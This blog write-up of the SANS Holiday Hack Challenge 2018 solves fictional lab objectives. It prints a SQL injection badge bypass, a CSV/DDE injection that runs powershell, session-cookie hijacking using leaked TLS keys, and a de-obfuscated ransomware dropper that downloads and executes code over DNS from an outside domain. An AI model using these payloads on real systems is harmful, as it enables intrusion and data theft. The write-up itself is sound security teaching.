---
layout: post-snow
title:  "SANS Holiday Hack Challenge 2018"
date:   2018-01-06 08:31:22 +0100
summary: "KringleCon, a security conference on the North Pole."
author: "Wesley van der Lee"
imgsubdir: "2018-sans-holiday-hack-challenge-kringlecon"
tag: "Write-up"
---
![KringleCon Invitation]({{ site.baseurl }}/images/{{ page.imgsubdir }}/KringleCon.png)

It is that time of the year again, the time for decorated Christmas trees, beautifully wrapped presents and of course the SANS Holiday Hack Challenge. This year’s edition brought us to KringleCon, a security conference for security professionals and enthusiasts, organized by Santa himself at his castle on the North Pole. After a globally orchestrated crowdsourced burglary attempt, time-traveling train hacking and an almost successful abominable war between the elves and the munchkins, it is time to build a community, build our skills and keep the holiday season safe from evil supervillains.

After weeks of waiting in front of the gate to Santa’s castle, the gate opened mid-December. Passing through the gate, we were greeted by Santa himself. He handed us the conference badge that gave us our objectives and the list of talks that are hosted at the conference. 

![Me and Santa]({{ site.baseurl }}/images/{{ page.imgsubdir }}/main-me-and-santa.png)


This report discusses the solved challenges and objectives, 14 in total, that are presented at KringleCon along with the storyline.

- [1. Orientation Challenge](#1-orientation-challenge)
- [2. Directory Browsing](#2-directory-browsing)
- [3. de Bruijn Sequences](#3-de-bruijn-sequences)
- [4. Data Repo Analysis](#4-data-repo-analysis)
- [5. AD Privilege Discovery](#5-ad-privilege-discovery)
- [6. Badge Manipulation](#6-badge-manipulation)
- [7. HR Incident Response](#7-hr-incident-response)
- [8. Network Traffic Forensics](#8-network-traffic-forensics)
- [9. Ransomware Recovery](#9-ransomware-recovery)
  - [9.a. Catch the Malware](#9a-catch-the-malware)
  - [9.b. Identify the Domain](#9b-identify-the-domain)
  - [9.c. Stop the malware](#9c-stop-the-malware)
  - [9.d. Recover Alabaster's Password](#9d-recover-alabasters-password)
- [10. Who Is Behind it all?](#10-who-is-behind-it-all)
- [Easter Eggs](#easter-eggs)
- [Narrative](#narrative)

## 1. Orientation Challenge
Directly located in the lobby of Santa’s castle we find the KringleCon Holiday Hack History kiosk. Our first objective is to answer a questionnaire presented at this kiosk. A secret phrase is presented once all answers are answered correctly.

What phrase is revealed when you answer all of the following KringleCon Holiday Hack History questions? Answer: **Happy Trails**

1. In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy? Answer: **Firmware**
2. In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation? Answer: **ATNAS**
3. In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left? Answer: **Business card**
4. In 2016, Linux terminals at the North Pole could be accessed with what kind of computer? Answer: **Cranberry Pi**
5. In 2017, the North Pole was being bombarded by giant objects. What were they?Answer: **Snowballs**
6. In 2017, Sam the snowman needed help reassembling pages torn from what? Answer: **The Great Book**

![Happy Trails]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch1-happy-trails.png)

All answers to the questions are given by Ed Skoudis' talk *Start Here* available on [youtube](https://www.youtube.com/watch?v=31JsKzsbFUo).

## 2. Directory Browsing
In order to arrange the presentations for the security conference, Santa set up a [Call for Papers](https://cfp.kringlecastle.com/) website to collect recent and interesting research topics. 

Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site to find out. Answer: **John McClane**

Upon visiting, the CFP website shows two buttons that lead you to the following URLs:
- `https://cfp.kringlecastle.com/index.html`
- `https://cfp.kringlecastle.com/cfp/cfp.html`

The second web page is hosted from a subdirectory `cfp` relative to the web root node. The server might be misconfigured such that directory listing for the subdirectory `cfp` is enabled. Visiting the subdirectory at `https://cfp.kringlecastle.com/cfp/` shows that directory listing is enabled and moreover shows an additional data file of the rejected talks: `rejected-talks.csv`. 
![Directory Listing of CFP Directory]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch2-index-of-cfp.png)

The file is available on `https://cfp.kringlecastle.com/cfp/rejected-talks.csv` and as the name suggests, the file contains the answer information about the rejected talks. When searching for the talk that we are interested in we find the author to be John McClane.

## 3. de Bruijn Sequences
The KringleCon Speaker Unpreparedness room is a place for frantic speakers to furiously complete their presentations. The room is protected by a door passcode. Upon entering the correct passcode, what message is presented to the speaker? Answer: **Welcome unprepared speaker!**

The locked door is protected by a 4 symbol code. The symbols are a triangle, square, circle and star. A code of four symbols with four symbol options has 256 different options. Luckily, entering more than four symbols, shifts all symbols one to the left. I.e. if we enter a triangle after the sequence square - circle - star - circle, the code becomes circle - star - circle - triangle, as the square symbol shifts outside of the code to the left.

The benefit of a shifting code is that after entering more than four symbols symbol, a new passcode will be constructed, which can be validated to open the door. As a result, one could construct a sequence of input symbols to optimize the number of inputs, such that all passcode combinations are validated. Such a sequence is called a de Bruijn sequence. A de Bruijn sequence is constructed based on two parameters: the number of symbols in a passcode, four in our example, and the variety of symbols, also four in our example. A de Bruijn Sequence with these parameters can be generated [here](http://www.hakank.org/comb/debruijn.cgi?k=4&n=4) and the resulting sequence is as follows:

```c
0000100020003001100120013002100220023003100320033010102010301110112011301
2101220123013101320133020203021102120213022102220223023102320233030311031
2031303210322032303310332033311112111311221123113211331212131222122312321
2331313221323133213332222322332323333000
```
In the above output we choose to use the following mapping:
- `0` => triangle
- `1` => square
- `2` => circle
- `3` => star

Upon entering the generated de Bruijn sequence at the door, we see that the sequence star - square - circle - star unlocks the door. After we enter the Speaker Unpreparedness room, we find Marcel Nougat presenting the message *Welcome unprepared speaker!*

![Correct Passcode]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch3-correct-guess.png)

## 4. Data Repo Analysis
Collaborative software development requires a Git repository and even Santa's elves incorporated an agile workflow. Some of Santa's castle's best-kept secrets can be securely shared on a public Git repo, if and only if the data itself is properly secured. Or is it?

Retrieve the encrypted ZIP file from [the North Pole Git repository](https://git.kringlecastle.com/Upatree/santas_castle_automation). What is the password to open this file? Answer: **Yippee-ki-yay**

The North Pole Git repository has a GitLab web interface. We can use the interface to search for ZIP files and immediately find one: `schematics/ventilation_diagram.zip`. 

![GitLab ZIP file search]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch4-gitlab-search.png)

The ZIP file is password protected.
![Password required for ventilation_diagram.zp]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch4-password-required.png)
If the elves are using the git repository for exchanging files, they might also use the git repo for exchanging information about the files. To search for sensitive information, we can use TruffleHog. TruffleHog is a tool that searches for passwords, keys and other possibly sensitive information on public git repositories based on detection rules and string entropy values.

The following command executes TruffleHog with the entropy setting enabled: 
```bash
trufflehog --regex --entropy=True https://git.kringlecastle.com/Upatree/santas_castle_automation.git
```

TruffleHog immediately detects a number of passphrases and keys, one of which looks very interesting in relation to our encrypted ZIP files, as illustrated in the following figure.

![TruffleHog Results]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch4-trufflehog-result.png)

The password to decrypt the ZIP file is Yippee-ki-yay.

## 5. AD Privilege Discovery
To administrate all of the elves' Windows user accounts, Santa set up an Active Directory. AD implementations often grow over time in size and complexity which could cause hidden and unintended relationships between user accounts and the to-be-protected crown jewels. An AD implementation is available in the SANS Slingshot Linux image for audit and revealment of the unwanted relationships. 

Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s login name (in username@domain.tld format)? Answer: **LDUBEJ00320@AD.KRINGLECASTLE.COM**

A Kerberoastable user account is a security risk, but a reliable path from a Kerberoastable user to the Domain Admins group is low hanging fruit for an attacker. These paths often go undetected for system administrators. 

The Slingshot Linux image provides a copy of the KRINGLECASTLE domain AD directory loaded into Bloodhound. Bloodhound is an analysis tool that models the Active Directory as a graph and uses graph theory to identify potential attack paths. After getting acquainted with the tool BloodHound, we find the menu that shows a graph of all *Shortest Paths to Domain Admins from Kerberoastable Users*. 

![BloodHound Shortest Path to DA]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch5-bloodhound-shortest-path-to-domain-admin.png)

There are five Kerberoastable accounts that have a path the Domain Admins group, but we are searching for a reliable path. We determine that RDP negatively constitutes to the reliability of a control path as it depends on separate local privilege escalation flaws. Once we exclude RDP from the paths, we end up with one user account, which is LDUBEJ00320@AD.KRINGLECASTLE.COM.

![BloodHound Kerberoastable User]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch5-bloodhound-kerberoastable-user.png)

## 6. Badge Manipulation
Santa's castle contains a secured room. The room is secured with an authentication mechanism, the Bade Scano-o-matic 4000, to grant access only to authorized elves. One of the authorized elves is Alabaster, of whom we have the following employee card.

![Alabaster's Employee Card]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch6-alabaster-badge.png)

Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available. What is the access control number revealed by the door authentication panel? Answer: **19880715**

If we enter the provided employee card from Alabster, we get the message that the authorized user account has been disabled. The message tells us that Alabaster is an authorized user and that the account has been disabled. Before we go any further, lets inspect what content the QR code represents.

If we scan the QR code with [goqr.me](http://goqr.me/), we see that the QR code encodes the value `oRfjg5uGHmbduj2m`.

Our first thought was that the value above uses some form of encoding for Alabaster's account. Decoding the value did not return anything useful. Our second thought was to raise a SQL exception by appending an apostrophe at the end of the string and observe the result. 

Using the website above, we generated a new QR code for the value `oRfjg5uGHmbduj2m'` and submitted the QR code to the machine. When the machine tries to process the modified QR code, the machine prints a SQL error that also contains the following SQL query: 
```sql
USER_INFO = QUERY SELECT FIRST_NAME, LAST_NAME, ENABLED FROM  EMPLOYEES WHERE AUTHORIZED = 1 AND UID = {}
```
The SQL query is likely injectible and we have the original query to craft our injection. From the query, we can see that the code represented on Alabaster's employee card, is Alabaster's UID in the database. This value is unique to the user account Alabaster.

If create a QR code from the value `'OR '1'='1` the SQL statement evaluates the clause that selects Alabaster's UID to `true` and retrieve the first authorized user from the database. An empty UID string works because `OR '1'='1'` resolves to true anyway. To bypass the system, we must also select an account that is enabled. Using an additional clause to select the user account that is also enabled, the query becomes:
```sql
USER_INFO = QUERY SELECT FIRST_NAME, LAST_NAME, ENABLED FROM  EMPLOYEES WHERE AUTHORIZED = 1 AND UID = '' OR '1'='1' AND Enabled='1'. 
```

To create the query above, we have to inject the value `' OR '1'='1' AND Enabled='1'` as the UID. We generated a QR code for the above value and are given access to the room behind the machine. Moreover, the machine returns the control number 19880715.

![Badge Scan-o-matic 4000 Bypassed]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch6-badge-success.png)

## 7. HR Incident Response
Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document `C:\candidate_evaluation.docx`. Which terrorist organization is secretly supported by the job applicant whose name begins with "K"? Answer: **Fancy Beaver**

The website is available at [careers.kringlecastle.com](https://careers.kringlecastle.com/) and shows a submission form for personal information and a csv file. The csv upload surely looks interesting, but before attacking, lets first get to know the website.

![Careers Website Index Page]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch7-careers-index.png)

Apart from the index page, there is also a custom 404 error page when you request a resource that cannot be found.

![Careers Website 404 Not Found Page]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch7-careers-404.png)

From the 404 page we can conclude that files hosted on `https://careers.kringlecastle.com/public/` are served from `C:\careerportal\resources\public\`. Our goal is to access a docx file located on `C:\candidate_evaluation.docx`. If we copy the docx file to the public folder on the system, the document becomes accessible through the website.

One way to execute the copy command is through a malicious payload in the CSV. If the csv file is opened in Microsoft Excel, we can exploit a Dynamic Data Exchange vulnerability that performs command execution through Excel formulas.

If a cell in Excel starts with the value `=`, the cell will be evaluated. A legitimate use case would be to enter mathematical functions such as `=A2+A3` to compute the sum of the contents of cels `A2` and `A3.` If we enter a Microsoft DDE command, such as `cmd`, after the equals operator, Excel uses the contents as an interprocess communication to call the applications contained in the formula, cmd.exe in our case.

For demonstration usage, a payload of `=cmd|'/C calc'!A1` opens up the Windows calculator, indicating that we can launch application. Analogously, we can also launch a powershell application with any powershell command we wish to execute. In our situation, we want to copy the document from `C:\candidate_evaluation.docx` to `C:\careerportal\resources\public\`. The command to achieve this becomes`=cmd|'/C powershell copy C:\candidate_evaluation.docx C:\careerportal\resources\public\LIT.docx'!A1`. We also renamed our text document, such that other KringleCon contestants do not find the document on accident.

We save our payload to a file with a `.csv` extension, and next download our document from `https://careers.kringlecastle.com/public/lit.docx`. 

Inside the document we see that one job applicant's name starts with a K, Krampus. The following comments were attached to the section about Krampus.
![Comments on Krampus in candidate_evaluation.docx]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch7-krampus-comments.png)

From the comments we can conclude that there is intelligence from the North Pole that links Krampus to cyber terrorist organization Fancy Beaver. So therefore Fancy Beaver is the answer to our objective.

## 8. Network Traffic Forensics
Santa has introduced a web-based packet capture and analysis tool at [packalyzer.kringlecastle.com](https://packalyzer.kringlecastle.com) to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? 

It appears that the packalyzer website is open to anyone after registration. We then see a website that lets you sniff network traffic for 20 seconds, after which one can analyze the sniffed traffic online or download the capture. Analyzing the sniffed network shows a number of TCP packets. The first three packets contain a three way handshake, which indicates that the content is likely encrypted with HTTP2. We would like to decrypt the contents, but for that we require the HTTP2 server keys.

Further poking around at the server had us discover the `/pub/` subdirectory. Furthermore, we also discovered a javascript source file inside the directory at `/pub/app.js`. The file appears to be the source file of our application. In the source file, we see an interesting piece of javascript, that possible helps us in finding the HTTP2 decryption keys.

```javascript
function load_envs() {
  var dirs = []
  var env_keys = Object.keys(process.env)
  for (var i=0; i < env_keys.length; i++) {
    if (typeof process.env[env_keys[i]] === "string" ) {
      dirs.push(( "/"+env_keys[i].toLowerCase()+'/*') )
    }
  }
  return uniqueArray(dirs)
}
```
From the above code snippet, we can see that a subdirectory is created for each environment variable stated in `process.env`. At the beginning of the file, we saw the variable `process.env ` contains at least `DEV` and `SSLKEYLOGFILE`.
```javascript
const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
``` 

The variable `SSLKEYLOGFILE`, and according to the javascript function `load_envs`, we can read out this file at [https://packalyzer.kringlecastle.com/sslkeylogfile/](https://packalyzer.kringlecastle.com/sslkeylogfile/).

When we visit the website, we see get the following error message:
```
Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/'
```

The error message indicates a new file, that after some tweaking around led us to the file `packalyzer_clientrandom_ssl.log` available at [/dev/packalyzer_clientrandom_ssl.log](https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log).

The file `packalyzer_clientrandom_ssl.log` is a rolling window of randomly generated keys for HTTP2 decryption of all clients in the network. Because the keys are changing, we need to sniff for traffic and next directly import the decryption keys in Wireshark.

After executing our plan, we can see unencrypted HTTP2 traffic in Wireshark. Our eyes immediately fall upon an interesting cookie that belongs to Alabaster's session. The cookie variable, `PASESSION`, belongs to the website, to verify a session after logging in. Alabaster's `PASESSION` value is `5700835983931747042244844949404614` which can be seen in the decrypted HTTP2 traffic in the following image.

![Decrypted HTTP2 traffic]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch8-http2-decrypted.png)

After logging into the Packalyzer website, we are given our own `PASESSION` variable. We can change our cookie to Alabaster's cookie value and hijack his session. There are multiple ways to modify your cookie values, the simplest of all is to use a browser plugin, i.e. EditThisCookie, and directly change you `PASESSION` value.

When we change our cookie value, we can immediately see that the server thinks we are Alabaster. 

![After Hijacking Alabaster's Session]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch8-cookie-hijacking.png)

Alabaster's account also holds an uploaded packet capture file `super_secret_packet_capture.pcap`, which we can download. The packet capture contains an unencrypted email send to Alabaster. The email holds a base64 encoded attachment.

![Mail with Attachment]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch8-mail-with-attachment.png)

We copied the base64 encoded content to our clipboard `xclip`. We can then execute the command `xclip | base64 -d > attachment`. Running the command `file attachment` shows that the file is a PDF document. We can open the PDF document and read its content. The main article is about piano keys, key frequency and transposing music. The end of the document applies transposing music to the piano keys of the song **Mary Had a Little Lamb**.

![Bottom of the Attachment: Mary Had a Little Lamb]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch8-mary-had-a-little-lamb.png)

## 9. Ransomware Recovery
Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. 

Next to Alabaster we see three different terminals. The terminal close to Alabaster, Elf Terminal, is encrypted with Wannacookie ransomware. Another terminal, Ho Ho Ho Daddy, allows us to register domain names, but most domains appear to be taken. Furthest away from Alabaser we see a terminal that runs Snort.
![WannaCookie Ransomware Infection]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch9-wannacookie.png)


### 9.a. Catch the Malware
Kringle Castle is currently under attacked by new piece of ransomware that is encrypting all the elves files. Our job is to configure Snort to alert on ONLY the bad ransomware traffic. A snapshot of the castle's DNS traffic is available at [Snortsensor1](http://Snortsensor1.kringlecastle.com/). One can log in with the username elf and password onashelf to access the network packet captures.

After downloading one network packet capture, we open the file in Wireshark. Immediately, specific DNS requests stand out. The following list shows a subset of the suspicious domain:
- `0.77616E6E61636F6F6B69652E6D696E2E707331.suanhgrbre.net`
- `0.77616E6E61636F6F6B69652E6D696E2E707331.bgerushnra.org`
- `77616E6E61636F6F6B69652E6D696E2E707331.suanhgrbre.net`

The domain name looks like a random string. Moreover, the domain name looks like a random order of all characters in the name of *Hans Gruber*. Malware is often known to query for randomly or dynamically generated domain names, to make the malware harder to detect and block. We could detect perform detection based on the permutations of all possible combinations of the characters in the name *Hans Gruber*, but this becomes a tedious task.

The subdomain appears to be constant and promises a better start for detecting the malware. The subdomain `77616E6E61636F6F6B69652E6D696E2E707331` is a hexadecimal encoding for `wannacookie.min.ps1`, which confirms our suspicion that the requests belong to the WannaCookie ransomware. Since all infected machines seem to query for the subdomain, we can setup the following Snort rule to detect the ransomware infected machines:
```alert udp any any <> any 53 (msg:"Wannacookie DNS Request/Answer"; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:1;)```

The rule alerts on UDP traffic to port 53. DNS traffic is performed over the UDP protocol and port 53 is the standard DNS port. The rule therefore hits on DNS traffic in both directions if the subdomain is contained in the DNS query or the DNS answer. If we add the rule to the Snort rule file `/etc/Snort/rules/local.rules`, the rule will be asserted on all passing traffic and raise an alert if our subdomain is detected.

Within a few seconds, we were prompted with the following message:

```
[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
```

### 9.b. Identify the Domain
All the elves were emailed a cookie recipe right before all the infections. Take [this document](https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip) with a password of elves and find the domain it communicates with. Using the Word docm file, identify the domain name that the malware communicates with.

After retrieving the docm file, we must be very careful with the file, since the docm is probably the start of the ransomware infection. When we run the command `file CHOCOLATE_CHIP_COOKIE_RECIPE.docm` we see that the document is a `Microsoft Word 2007+` document. Malicious word documents often contain VBA Macros that use [Object Linking & Embedding](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding) for code execution. We can analyze the docm with the tool [olevba](https://github.com/decalage2/oletools/wiki/olevba) to detect safely output the VBA macros. We run the tool with the command `olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm`, which results in the following output.

![WannaCookie Ransomware Infection]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch9b-olevba-result.png)

Olevba shows that Word's AutoOpen macro invokes a malicious powershell command. The macro is executed everytime the document is opened with macro's enabled. The powershell command executes compressed unreadable code with the `Invoke-Expression` *iex* PowerShell function. To see what command is executed in readable form, we simply remove the *iex* function, pipe the result to an Out String and execute the resulting code in powershell.

```powershell
function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; iex($(H2A $h | Out-string))
```
From the readable code, we can see that the macro communicates with the server **erohetfanu.com**.

The server domain erohetfanu is the ROT13-reverse encoding of again hansgruber.

### 9.c. Stop the malware
Alabaster tells us that blocking erohetfanu will not completely eradicate the ransomware, since Snort rules also show other domains being queried. There are likely multiple versions of the ransomware that contact different domains. We remember the ransomware WannaCry from summer 2017 that had a kill switch in its source code. Possibly, this type of ransomware would also have such a mechanism.

The powershell code presented in challenge 9.b. is simply the dropper of the ransomware. The dropper works as follows:
1. Over DNS a file is requested from the server erohetfanu.com. The file name is specified in a hexadecimal encoding and is send to the server as a subdomain.
2. The server then resonds with a TXT record with an integer value that indicates the number of blocks the requested file is split up into, The requested file cannot be replied back in the same DNS request, due to the file size.
3. Then for each block, the macro queries the subdomain prepended with the block number and appends the result. This process eventually results in the ransomware code.

The above procedure is executed for the file `wannacookie.min.ps1`, but possibly a non-minified version of the ransomware source code is also available. We therefore want to access the file `wannacookie.ps1`. We can request that file by executing the macro code for the subdomain `77616E6E61636F6F6B69652E707331`, which is the hexadecimal encoding for `wannacookie.ps1`. 

The file `wannacookie.ps1` exists and our method returns the full source code of the ransomware. The source code contains a number of encryption and character encoding conversions. On the bottom we see the function `wannacookie` which is the main function of the code. Our goal is to identify a possible kill switch from the code.

We immediately see the following statement at the beginning of the `wannacookie` function.

```powershell
 $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
 if ($null -ne((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
  return
 };
```

From the above code snippet, we see that the main function returns, i.e. stops, before encrypting files on the system, if the `if`-statement evaluates to true. The statement checks whether a certain DNS name cannot be resolved, To identify the DNS name in question, we can execute the code that is used to compute the DNS name.

```powershell
$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))
```

The code above returns the value **yippeekiyaa.aaay**, which is our kill switch domain! After we register the domain yippeekiyaa.aaay at the Ho Ho Ho Daddy terminal, Alabaster reports that the ransomware has stopped spreading.
        
### 9.d. Recover Alabaster's Password
Unfortunately the kill switch was discovered too late to protect Alabaster's assets from encryption by WannaCookie. Luckily Alabaster made a memory dump after encryption for us to work with to decrypt an encrypted database file. Recover Alabaster's password as found in the encrypted password vault. Answer: **ED#ED#EED#EF#G#F#G#ABA#BA#B**.

In the previous exercise we acquired the ransomware source code. We see that the files are encrypted with the following command:
```powershell
enc_dec $Byte_key $future_cookies $true
```
- `enc_dec` is the function that either encrypts or decrypts based on the third parameter
- `$Byte_key` is the key that is used to encrypt the files.
- `$future_cookies` is an array of all the files that will be encrypted
- `$true` means encrypt, `$false` would decrypt the files.

From the source code we also see that the variable `$Byte_key` is cleared after the files are encrypted. Therefore it is unlikely to recover the encryption key from Alabaster's memory dump. Luckily we also see that the encryption key is encrypted with a public key and send to the WannaCookie command and control server. This is done in the following way.

In the WannaCookie's main function, a public key file `server.crt` is retrieved.
```powershell
$pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
```

Next the `Pub_Key_Enc` method is invoked that encrypts the `$Byte_key` content with the public certificate. The malware authors are most likely in possession of the private key, such that they are able to decrypt the encryption key `$Byte_key`. 
```powershell
$Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
```

Analyzing our encrypted WannaCookie encryption key in a debugger shows that the variable `$Pub_key_encrypted_Key` in hexadecimal format a length has of 512 characters. Since this variable is not cleared by the ransomware source code, chances are that we can read this value from Alabaster's memory dump.

We can search for powershell variables with Chris David's [Powerdump](https://github.com/chrisjd20/power_dump). If we load and analyze Alabaster's memory dump with Powerdump, we can see 10947 powershell variable values. If we filter all those variables for variables with a length of 512 characters, one variable is found.

![One powershell variable with length 512]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch9-encrypted-encryption-key.png)

Before we can use Alabaster's WannaCookie encryption and decryption key we first need to decrypt the powershell variable with a private key that belongs to the earlier found encryption key. The private key is not mentioned or retrieved in the WannaCookie source code, so our first attempt was to retrieve the key from the server in the same way that the public key was retrieved. The private key file could have any name, but among our first guesses we tried `server.key` which resulted, as expected, in the private key that belongs to `server.crt`. We can access the private key with the following command. Note that `7365727665722e6b6579` is the hexadecimal encoding for `server.key`.

```powershell
$priv_key = $(get_over_dns("7365727665722e6b6579") )
```

The command returns the following private key.

![Private Key]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch9-private-key.png)

The next step is to decrypt our found powershell variable of length 512 with the private key above. This process results in the hexadecimal value `fbcfc121915d99cc20a3d3d5d84f8308`, which in fact represents the `$Byte_key` that can be used to encrypt and decrypt files. 

The following powershell code uses some of WannaCookie's to decrypt all files with the .wannacookie extension, in our case `alabaster_passwords.elfdb.wannacookie`. 

```powershell
$Byte_key = $(H2B "fbcfc121915d99cc20a3d3d5d84f8308")
[array]$files = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
enc_dec $akey $files $false
```

After running the powershell code, we indeed see a decrypted database. If we open the database file in `sqlite3` and then select all entries in the table `passwords`, we see the following result. 

![Alabaster's passwords]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch9-decrypted-database.png)

From the database we can conclude that Alabaster's password is **ED#ED#EED#EF#G#F#G#ABA#BA#B**.

## 10. Who Is Behind it all?
Who was the mastermind behind the whole KringleCon plan? Answer: **Santa**.

To answer our final objective, we need to access Santa's secret vault. To the right of Alabaster, we see a locked door which can be unlocked by a piano keyboard. The keyboard requires 18 correct keys to be entered. We soon remember that Alabaster's password from the previous question exists of 18 keys.When we enter Alabaster's password on the piano lock, the following message is returned:

![Piano key out of tune]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch10-piano-off-key.png)

From the presented message we can conclude that we are getting closer, since entering random keys does not present a message at all. The message tells us that the keys are in the wrong key. It is likely not a coincidence that a previous objective resulted in a document that explains how to transpose music keys. The email to Alabaster that contained the document also holds the hint:

> He said you favorite key was D.

Our task is to transpose Alabaster's password to the key of D. Alabaster's password was written in the key of E. To transpose E to D, all keys must be lowered by one whole key. For this procedure we can follow the explanation from the document.  Transposing Alabaster's passphrase results in the key sequence DC#DC#DDC#DEF#EF#GAG#AG#A.

If we enter our transposed key sequence on the piano lock, the following message is returned.

![Piano Correct Key]({{ site.baseurl }}/images/{{ page.imgsubdir }}/sans-ch10-piano-correct.png)

As the door opens, we pass through to see Santa and Hans standing together. Santa explains that he had set up the entire attack with help of his friend Hans, who was playing the bad guy. Santa wanted to see who was qualified enough to help him out in defending his Castle and Christmas operations for next year. 


## Easter Eggs
Every year the SANS Holiday Hack Challenge contains easter eggs, which often are references to a specific movie. Without a doubt, we can state that this winter's edition revolved around the Die Hard movie. The following references have been found:
- From question 2: The main character of all Die Hard movies, John McClane, was the person who submitted the rejected talk. 
- From question 4: The password to the encrypted ZIP file, Yippee-ki-yay, was the catchphrase used by John McClane in all Die Hard movies.
- From question 6: The control number, 19880715, clearly represents the date June 15th 1988. which is the release date of the first Die Hard movie in the United States.
- From question 9a: The domain name of the DNS requests, which appear to be random, is the name *Hans Gruber* shuffled.
- From question 9c: The kill switch domain, yippeekiyaa.aaay, is John McClane's famous catchphrase.

## Narrative
The following is the complete narrative, which becomes visible after completing all the objectives.

> As you walk through the gates, a familiar red-suited holiday figure warmly welcomes all of his special visitors to KringleCon.

> Suddenly, all elves in the castle start looking very nervous. You can overhear some of them talking with worry in their voices.

> The toy soldiers, who were always gruff, now seem especially determined as they lock all the exterior entrances to the building and barricade all the doors. No one can get out! And the toy soldiers' grunts take on an increasingly sinister tone.

> The toy soldiers act even more aggressively. They are searching for something -- something very special inside of Santa’s castle -- and they will stop at NOTHING until they find it. Hans seems to be directing their activities.

> In the main lobby on the bottom floor of Santa's castle, Hans calls everyone around to deliver a speech. Make sure you visit Hans to hear his speech.

> The toy soldiers continue behaving very rudely, grunting orders to the guests and to each other in vaguely Germanic phrases. Suddenly, one of the toy soldiers appears wearing a grey sweatshirt that has written on it in red pen, "NOW I HAVE A ZERO-DAY. HO-HO-HO."

> A rumor spreads among the elves that Alabaster has lost his badge. Several elves say, "What do you think someone could do with that?"

> Hans has started monologuing again. Please visit him in Santa's lobby for a status update.

> Great work! You have blocked access to Santa's treasure... for now. Please visit Hans in Santa's Secret Room for an update.

> And then suddenly, Hans slips and falls into a snowbank. His nefarious plan thwarted, he's now just cold and wet.

> But Santa still has more questions for you to solve!

> Congrats! You have solved the hardest challenge! Please visit Santa and Hans inside Santa's Secret Room for an update on your amazing accomplishment!